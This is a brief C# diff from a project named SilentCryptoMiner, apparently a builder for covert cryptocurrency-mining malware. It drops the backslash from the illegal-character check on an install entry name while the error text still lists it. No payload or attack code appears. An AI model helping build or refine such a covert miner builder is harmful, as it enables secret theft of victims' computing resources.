@@ -84,7 +84,7 @@ namespace SilentCryptoMiner
 
                 if (chkInstall.Checked)
                 {
-                    foreach (var item in @"\/:*?""<>|")
+                    foreach (var item in @"/:*?""<>|")
                     {
                         if (BuildErrorTest(txtInstallEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: \\/:*?\"<>| ")) return;
                     }
